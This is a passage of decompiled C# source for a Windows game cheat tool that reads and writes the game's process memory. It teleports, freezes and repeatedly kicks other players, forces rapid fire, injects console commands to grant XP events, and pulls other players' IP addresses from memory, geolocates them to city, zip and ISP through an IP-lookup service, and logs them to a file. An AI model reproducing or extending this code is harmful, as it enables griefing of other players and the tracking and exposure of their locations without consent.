				Main.<>o__73.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__73.<>p__0.Target(Main.<>o__73.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				if (gclient != 0L)
				{
					this.Lbl_CurrentWeaponIndex.Text = string.Format("Weapon ID: {0}", this.mem.ReadInt(gclient + 40L));
				}
			}
		}

		// Token: 0x060001EA RID: 490 RVA: 0x0000D000 File Offset: 0x0000D000
		private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
		{
			if (Main.<>o__74.<>p__0 == null)
			{
				Main.<>o__74.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__74.<>p__0.Target(Main.<>o__74.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.checkBox1.Checked)
				{
					this.BW_TeleportZombies.RunWorkerAsync();
					return;
				}
				this.BW_TeleportZombies.CancelAsync();
			}
		}

		// Token: 0x060001EB RID: 491 RVA: 0x0000D08C File Offset: 0x0000D08C
		private void BW_TeleportZombies_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.checkBox1.Checked)
			{
				for (int i = 137; i < 178; i++)
				{
					long gentity = this.GetGEntity(i);
					bool flag = this.mem.ReadInt(gentity + 920L) != 0;
					int num = this.mem.ReadInt(gentity + 8L);
					if (flag && (num == 1074856960 || num == 1115136))
					{
						this.mem.WriteFloat(gentity + 724L, this.TeleportPos[0]);
						this.mem.WriteFloat(gentity + 728L, this.TeleportPos[1]);
						this.mem.WriteFloat(gentity + 732L, this.TeleportPos[2]);
					}
				}
			}
		}

		// Token: 0x060001EC RID: 492 RVA: 0x00005140 File Offset: 0x00005140
		private void bw_onlineGame_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x060001ED RID: 493 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton15_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001EE RID: 494 RVA: 0x0000D161 File Offset: 0x0000D161
		private void thirteenButton16_Click(object sender, EventArgs e)
		{
			MessageBox.Show("When you load into the game, can see your weapon n shit, press god mode, infinite ammo, set tele location n shit. Then press online game, do what you gotta do. then before you end the game, UNCHECK online game. Then press the button above to make you not crash. Then you can end the game.");
		}

		// Token: 0x060001EF RID: 495 RVA: 0x00005140 File Offset: 0x00005140
		private void toolStripMenuItem2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x00005140 File Offset: 0x00005140
		private void toolStripMenuItem3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x00005140 File Offset: 0x00005140
		private void toolStripMenuItem5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x00005140 File Offset: 0x00005140
		private void toolStripMenuItem6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x0000D170 File Offset: 0x0000D170
		private void teleportToClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__84.<>p__0 == null)
			{
				Main.<>o__84.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__84.<>p__0.Target(Main.<>o__84.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.clientPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.clientPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.clientPos[2] = this.mem.ReadFloat(gclient + 3568L);
				long gclient2 = this.GetGClient(0);
				this.mem.WriteFloat(gclient2 + 3560L, this.clientPos[0]);
				this.mem.WriteFloat(gclient2 + 3564L, this.clientPos[1]);
				this.mem.WriteFloat(gclient2 + 3568L, this.clientPos[2]);
			}
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x0000D2A8 File Offset: 0x0000D2A8
		private void teleportClientToYouToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__85.<>p__0 == null)
			{
				Main.<>o__85.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__85.<>p__0.Target(Main.<>o__85.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.myPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.myPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.myPos[2] = this.mem.ReadFloat(gclient + 3568L);
				long gclient2 = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteFloat(gclient2 + 3560L, this.myPos[0]);
				this.mem.WriteFloat(gclient2 + 3564L, this.myPos[1]);
				this.mem.WriteFloat(gclient2 + 3568L, this.myPos[2]);
			}
		}

		// Token: 0x060001F5 RID: 501 RVA: 0x00005140 File Offset: 0x00005140
		private void teleportToClientToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F6 RID: 502 RVA: 0x00005140 File Offset: 0x00005140
		private void teleportClientToYouToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton15_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060001F8 RID: 504 RVA: 0x0000D3DE File Offset: 0x0000D3DE
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("Click this check in private match before you start the game. Do what you gotta do in the game, you can turn timescale up if you wish, just make sure to turn it back down before ending. Now BEFORE you end the game, uncheck the box. Or else you will crash.");
		}

		// Token: 0x060001F9 RID: 505 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton16_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060001FA RID: 506 RVA: 0x0000D3EC File Offset: 0x0000D3EC
		public void TimeUpdate()
		{
			for (;;)
			{
				TimeZoneInfo destinationTimeZone = TimeZoneInfo.FindSystemTimeZoneById("Pacific Standard Time");
				TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, destinationTimeZone);
				Thread.Sleep(30000);
			}
		}

		// Token: 0x060001FB RID: 507 RVA: 0x00005140 File Offset: 0x00005140
		private void timer1_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x060001FC RID: 508 RVA: 0x0000D41C File Offset: 0x0000D41C
		private void thirteenButton17_Click(object sender, EventArgs e)
		{
			if (Main.<>o__93.<>p__0 == null)
			{
				Main.<>o__93.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(bool), typeof(Main)));
			}
			if (Main.<>o__93.<>p__0.Target(Main.<>o__93.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long lpBaseAddress = this.mem.ReadInt64(this.mem.BaseAddress + this.jumpOffset + (long)(3392 * i)) + 304L;
					this.mem.WriteFloat(lpBaseAddress, Convert.ToSingle(this.jumpHeight.Text));
				}
			}
		}

		// Token: 0x060001FD RID: 509 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton18_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001FE RID: 510 RVA: 0x0000D4D4 File Offset: 0x0000D4D4
		private void teleportClientToSpaceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__95.<>p__0 == null)
			{
				Main.<>o__95.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__95.<>p__0.Target(Main.<>o__95.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteFloat(gclient + 3560L, 100000000f);
				this.mem.WriteFloat(gclient + 3564L, 100000000f);
				this.mem.WriteFloat(gclient + 3568L, 100000000f);
			}
		}

		// Token: 0x060001FF RID: 511 RVA: 0x00005140 File Offset: 0x00005140
		private void teleoprtClientToSpaceToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000200 RID: 512 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton19_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000201 RID: 513 RVA: 0x00005140 File Offset: 0x00005140
		private void jump2Box_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000202 RID: 514 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton18_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000203 RID: 515 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton18_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x06000204 RID: 516 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox5_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000205 RID: 517 RVA: 0x00005140 File Offset: 0x00005140
		private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000206 RID: 518 RVA: 0x00005140 File Offset: 0x00005140
		private void freezeClientInPlaceToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000207 RID: 519 RVA: 0x0000D5A8 File Offset: 0x0000D5A8
		private void freezeClientInPlaceToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (Main.<>o__104.<>p__0 == null)
			{
				Main.<>o__104.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__104.<>p__0.Target(Main.<>o__104.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteFloat(gclient + this.speedLong, 0f);
			}
		}

		// Token: 0x06000208 RID: 520 RVA: 0x0000D64C File Offset: 0x0000D64C
		private void thirteenButton18_Click_3(object sender, EventArgs e)
		{
			if (Main.<>o__105.<>p__0 == null)
			{
				Main.<>o__105.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__105.<>p__0.Target(Main.<>o__105.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.TeleportPos[0] = this.mem.ReadFloat(gclient + 3560L);
				this.TeleportPos[1] = this.mem.ReadFloat(gclient + 3564L);
				this.TeleportPos[2] = this.mem.ReadFloat(gclient + 3568L);
			}
		}

		// Token: 0x06000209 RID: 521 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton20_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600020A RID: 522 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton21_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600020B RID: 523 RVA: 0x0000D70C File Offset: 0x0000D70C
		private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			MessageBox.Show("");
		}

		// Token: 0x0600020C RID: 524 RVA: 0x00005140 File Offset: 0x00005140
		private void killClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600020D RID: 525 RVA: 0x00005140 File Offset: 0x00005140
		private void expireL_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600020E RID: 526 RVA: 0x00005140 File Offset: 0x00005140
		private void groupBox1_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x0600020F RID: 527 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox6_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000210 RID: 528 RVA: 0x00005140 File Offset: 0x00005140
		private void mp_rapidFire_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000211 RID: 529 RVA: 0x0000D71C File Offset: 0x0000D71C
		private void thirteenButton22_Click(object sender, EventArgs e)
		{
			for (int i = 0; i < 18; i++)
			{
				long gclient = this.GetGClient(i);
				if (this.mem.ReadString(gclient + 24668L).ToLower().Contains("lols"))
				{
					this.mem.WriteInt(gclient + 3712L, -1);
					this.mem.WriteInt(gclient + 3692L, -1);
				}
			}
		}

		// Token: 0x06000212 RID: 530 RVA: 0x0000D78A File Offset: 0x0000D78A
		private void zmRapid_CheckedChanged(object sender, EventArgs e)
		{
			if (this.zmRapid.Checked)
			{
				this.zm_rapidFire.RunWorkerAsync();
				return;
			}
			this.zm_rapidFire.CancelAsync();
		}

		// Token: 0x06000213 RID: 531 RVA: 0x0000D7B0 File Offset: 0x0000D7B0
		private void zm_rapidFire_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.zmRapid.Checked)
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + 3712L, 0);
					this.mem.WriteInt(gclient + 3692L, 0);
				}
			}
		}

		// Token: 0x06000214 RID: 532 RVA: 0x0000D808 File Offset: 0x0000D808
		private void thirteenButton5_Click_4(object sender, EventArgs e)
		{
			if (Main.<>o__117.<>p__0 == null)
			{
				Main.<>o__117.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__117.<>p__0.Target(Main.<>o__117.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.GetGClient(0);
			}
		}

		// Token: 0x06000215 RID: 533 RVA: 0x00005140 File Offset: 0x00005140
		private void tpTest_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000216 RID: 534 RVA: 0x0000D878 File Offset: 0x0000D878
		private void tpTest_CheckedChanged_1(object sender, EventArgs e)
		{
			if (Main.<>o__119.<>p__0 == null)
			{
				Main.<>o__119.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__119.<>p__0.Target(Main.<>o__119.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.tpTest.Checked)
				{
					this.teleportBots.RunWorkerAsync();
				}
				this.teleportBots.CancelAsync();
			}
		}

		// Token: 0x06000217 RID: 535 RVA: 0x0000D904 File Offset: 0x0000D904
		private void bw_tpTest_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.tpTest.Checked)
			{
				for (int i = 137; i < 175; i++)
				{
					long gentity = this.GetGEntity(i);
					bool flag = this.mem.ReadInt(gentity + 920L) != 0;
					int num = this.mem.ReadInt(gentity + 8L);
					if (flag && (num == 1074856960 || num == 1115136))
					{
						this.mem.WriteFloat(gentity + 724L, this.TeleportPos[0]);
						this.mem.WriteFloat(gentity + 728L, this.TeleportPos[1]);
						this.mem.WriteFloat(gentity + 732L, this.TeleportPos[2]);
					}
				}
			}
		}

		// Token: 0x06000218 RID: 536 RVA: 0x0000D9D9 File Offset: 0x0000D9D9
		private void getOffsets()
		{
			this.PlayerCompPtr = this.mem.BaseAddress + 265315656L;
			this.ZmBotBase = this.PlayerCompPtr + 104L;
			this.ZmBotListBase = this.ZmBotBase + 8L;
		}

		// Token: 0x06000219 RID: 537 RVA: 0x0000DA14 File Offset: 0x0000DA14
		private void kickClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__125.<>p__0 == null)
			{
				Main.<>o__125.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__125.<>p__0.Target(Main.<>o__125.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				string str = this.dataGridView1.Rows[this.dataGridView1.CurrentRow.Index].Cells[0].Value.ToString();
				for (int i = 0; i < 10; i++)
				{
					this.sendCbuf("kick " + str);
				}
			}
		}

		// Token: 0x0600021A RID: 538 RVA: 0x0000DAD0 File Offset: 0x0000DAD0
		private void thirteenButton14_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__126.<>p__0 == null)
			{
				Main.<>o__126.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__126.<>p__0.Target(Main.<>o__126.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				if (gclient != 0L)
				{
					Clipboard.SetText(this.mem.ReadInt(gclient + 40L).ToString());
				}
			}
		}

		// Token: 0x0600021B RID: 539 RVA: 0x00005140 File Offset: 0x00005140
		private void kickClientToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600021C RID: 540 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton15_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x0600021D RID: 541 RVA: 0x00005140 File Offset: 0x00005140
		private void giveAC130ToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600021E RID: 542 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox6_CheckedChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600021F RID: 543 RVA: 0x0000DB60 File Offset: 0x0000DB60
		private void thirteenButton11_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__131.<>p__0 == null)
			{
				Main.<>o__131.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__131.<>p__0.Target(Main.<>o__131.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				MessageBox.Show(this.mem.ReadInt(this.mem.BaseAddress + this.onlineOffset).ToString());
			}
		}

		// Token: 0x06000220 RID: 544 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox6_CheckedChanged_2(object sender, EventArgs e)
		{
		}

		// Token: 0x06000221 RID: 545 RVA: 0x0000DBF4 File Offset: 0x0000DBF4
		private void thirteenButton22_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__133.<>p__0 == null)
			{
				Main.<>o__133.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__133.<>p__0.Target(Main.<>o__133.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteString(this.mem.BaseAddress + this.cbufOffset, "addservereventgroup live_event_xp mode_warzone everyone \"\";addclienteventgroup live_event_gunxp mode_multiplayer;addservereventgroup live_event_xp mode_zombies everyone \"\";addservereventgroup live_event_gunxp mode_zombies everyone \"\";addclienteventgroup live_event_xp mode_multiplayer;addservereventgroup live_event_xp mode_multiplayer everyone \"\";addclienteventgroup live_event_xp mode_zombies;addclienteventgroup live_event_gunxp mode_warzone;addservereventgroup live_event_gunxp mode_warzone everyone");
				this.mem.WriteBool(this.mem.BaseAddress + this.cbufOffset2, true);
				this.mem.WriteString(this.mem.BaseAddress + this.cbufOffset, "addservereventgroup live_event_xp mode_warzone everyone \"\";addclienteventgroup live_event_gunxp mode_multiplayer;addservereventgroup live_event_xp mode_zombies everyone \"\";addservereventgroup live_event_gunxp mode_zombies everyone \"\";addclienteventgroup live_event_xp mode_multiplayer;addservereventgroup live_event_xp mode_multiplayer everyone \"\";addclienteventgroup live_event_xp mode_zombies;addclienteventgroup live_event_gunxp mode_warzone;addservereventgroup live_event_gunxp mode_warzone everyone;");
				this.mem.WriteBool(this.mem.BaseAddress + this.cbufOffset2, true);
			}
		}

		// Token: 0x06000222 RID: 546 RVA: 0x0000DCE0 File Offset: 0x0000DCE0
		private void thirteenButton23_Click(object sender, EventArgs e)
		{
			if (Main.<>o__134.<>p__0 == null)
			{
				Main.<>o__134.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__134.<>p__0.Target(Main.<>o__134.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteString(this.mem.BaseAddress + this.cbufOffset, "addservereventgroup live_event_xp mode_warzone everyone \"\";addclienteventgroup live_event_gunxp mode_multiplayer;addservereventgroup live_event_xp mode_zombies everyone \"\";addservereventgroup live_event_gunxp mode_zombies everyone \"\";addclienteventgroup live_event_xp mode_multiplayer;addservereventgroup live_event_xp mode_multiplayer everyone \"\";addclienteventgroup live_event_xp mode_zombies;addclienteventgroup live_event_gunxp mode_warzone;addservereventgroup live_event_gunxp mode_warzone everyone");
				this.mem.WriteBool(this.mem.BaseAddress + this.cbufOffset2, true);
				this.mem.WriteString(this.mem.BaseAddress + this.cbufOffset, "addservereventgroup live_event_xp mode_warzone everyone \"\";addclienteventgroup live_event_gunxp mode_multiplayer;addservereventgroup live_event_xp mode_zombies everyone \"\";addservereventgroup live_event_gunxp mode_zombies everyone \"\";addclienteventgroup live_event_xp mode_multiplayer;addservereventgroup live_event_xp mode_multiplayer everyone \"\";addclienteventgroup live_event_xp mode_zombies;addclienteventgroup live_event_gunxp mode_warzone;addservereventgroup live_event_gunxp mode_warzone everyone;");
				this.mem.WriteBool(this.mem.BaseAddress + this.cbufOffset2, true);
			}
		}

		// Token: 0x06000223 RID: 547 RVA: 0x0000DDCC File Offset: 0x0000DDCC
		private void thirteenButton24_Click(object sender, EventArgs e)
		{
			if (Main.<>o__135.<>p__0 == null)
			{
				Main.<>o__135.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(bool), typeof(Main)));
			}
			if (Main.<>o__135.<>p__0.Target(Main.<>o__135.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long lpBaseAddress = this.mem.BaseAddress + this.jumpOffset + 1648L + 304L;
				this.mem.WriteFloat(lpBaseAddress, Convert.ToSingle(this.jumpHeight.Text));
			}
		}

		// Token: 0x06000224 RID: 548 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox7_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000225 RID: 549 RVA: 0x00005140 File Offset: 0x00005140
		private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000226 RID: 550 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton24_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000227 RID: 551 RVA: 0x0000DE68 File Offset: 0x0000DE68
		private void copyIPToClipboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Clipboard.SetText(this.dataGridView1.Rows[this.dataGridView1.CurrentRow.Index].Cells[1].Value.ToString());
		}

		// Token: 0x06000228 RID: 552 RVA: 0x0000DEA4 File Offset: 0x0000DEA4
		public string Locations(string IP)
		{
			string result;
			try
			{
				string[] array = new WebClient().DownloadString("http://ip-api.com/csv/" + IP).Split(new char[]
				{
					','
				});
				string text = array[4];
				string text2 = array[5];
				string text3 = array[6];
				string text4 = array[10] + " / " + array[11];
				return string.Concat(new string[]
				{
					text,
					"|",
					text2,
					"|",
					text3,
					"|",
					text4
				});
			}
			catch
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x06000229 RID: 553 RVA: 0x0000DF50 File Offset: 0x0000DF50
		private void geolocationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string[] array = this.Locations(this.dataGridView1.Rows[this.dataGridView1.CurrentRow.Index].Cells[1].Value.ToString()).Split(new char[]
			{
				'|'
			});
			MessageBox.Show(string.Concat(new string[]
			{
				"State: ",
				array[0],
				Environment.NewLine,
				"City:",
				array[1],
				Environment.NewLine,
				"Zip: ",
				array[2],
				Environment.NewLine,
				"ISP: ",
				array[3]
			}));
		}

		// Token: 0x0600022A RID: 554 RVA: 0x00005140 File Offset: 0x00005140
		private void geoloactionToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600022B RID: 555 RVA: 0x00005140 File Offset: 0x00005140
		private void copyIPToClipboardToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600022C RID: 556 RVA: 0x0000E010 File Offset: 0x0000E010
		public string LocationsGraph(string IP)
		{
			string result;
			try
			{
				string[] array = new WebClient().DownloadString("http://ip-api.com/csv/" + IP).Split(new char[]
				{
					','
				});
				return array[4] + ", " + array[5];
			}
			catch
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x0600022D RID: 557 RVA: 0x0000E074 File Offset: 0x0000E074
		private void thirteenButton21_Click_1(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			if (Main.<>o__146.<>p__0 == null)
			{
				Main.<>o__146.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__146.<>p__0.Target(Main.<>o__146.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.ipGridView.Refresh();
				this.ipGridView.Rows.Clear();
				long num = 984L;
				for (int i = 0; i < 18; i++)
				{
					long pAddress = this.mem.BaseAddress + 326425063L + num * (long)i;
					long pAddress2 = this.mem.BaseAddress + 326424944L + num * (long)i;
					string text = Main.convertIp(this.mem.ReadBytes(pAddress2, 4));
					if (text != "0.0.0.0")
					{
						this.ipGridView.Rows.Add();
						if (this.myIPPP == text)
						{
							this.ipGridView[1, i].Value = "Hidden :)";
						}
						else
						{
							this.ipGridView[1, i].Value = text;
						}
						this.ipGridView[0, i].Value = this.mem.ReadString(pAddress);
						if (this.checkBox6.Checked)
						{
							this.ipGridView[2, i].Value = this.LocationsGraph(text);
						}
					}
				}
			}
		}

		// Token: 0x0600022E RID: 558 RVA: 0x0000E1FF File Offset: 0x0000E1FF
		private void copyIPToClipboardToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			Clipboard.SetText(this.ipGridView.Rows[this.ipGridView.CurrentRow.Index].Cells[1].Value.ToString());
		}

		// Token: 0x0600022F RID: 559 RVA: 0x0000E23C File Offset: 0x0000E23C
		private void betterGeolocationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string[] array = this.Locations(this.ipGridView.Rows[this.ipGridView.CurrentRow.Index].Cells[1].Value.ToString()).Split(new char[]
			{
				'|'
			});
			MessageBox.Show(string.Concat(new string[]
			{
				"State: ",
				array[0],
				Environment.NewLine,
				"City: ",
				array[1],
				Environment.NewLine,
				"Zip: ",
				array[2],
				Environment.NewLine,
				"ISP: ",
				array[3]
			}));
		}

		// Token: 0x06000230 RID: 560 RVA: 0x00005140 File Offset: 0x00005140
		private void tabPage4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000231 RID: 561 RVA: 0x0000E2FC File Offset: 0x0000E2FC
		private void thirteenButton25_Click(object sender, EventArgs e)
		{
			try
			{
				for (int i = 0; i < this.ipGridView.Rows.Count - 1; i++)
				{
					File.AppendAllText("IPLogs.txt", this.ipGridView.Rows[i].Cells[0].Value.ToString() + " | " + this.ipGridView.Rows[i].Cells[1].Value.ToString() + Environment.NewLine);
				}
				MessageBox.Show("Data Added to: " + Directory.GetCurrentDirectory() + "\\IPLogs.txt");
			}
			catch
			{
				MessageBox.Show("Error Saving to: " + Directory.GetCurrentDirectory() + "\\IPLogs.txt");
			}
		}

		// Token: 0x06000232 RID: 562 RVA: 0x00005140 File Offset: 0x00005140
